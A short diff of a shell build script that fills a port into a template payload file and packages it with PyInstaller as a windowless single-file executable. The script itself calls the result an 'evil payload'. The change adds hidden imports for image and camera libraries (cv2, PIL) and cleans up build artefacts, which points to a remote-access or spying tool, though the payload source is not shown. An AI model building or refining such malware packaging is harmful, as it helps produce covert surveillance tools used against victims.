@@ -36,8 +36,14 @@ else
   sed -i "s|__PORT__|$PORT|g" payload_temp.py
 fi
 echo "[*] Building evil payload..."
-pyinstaller --onefile --noconsole --name payload ./payload_temp.py
+pyinstaller --onefile --noconsole --name payload \
+    --additional-hooks-dir=hooks \
+    --hidden-import cv2 \
+    --hidden-import numpy \
+    --hidden-import PIL \
+    ./payload_temp.py
 echo "[*] Cleaning up..."
 rm -f payload_temp.py
 rm -rf __pycache__ build/
+rm -rf payload.spec
 echo "[+] Evil payload built: dist/evil_payload 😈"
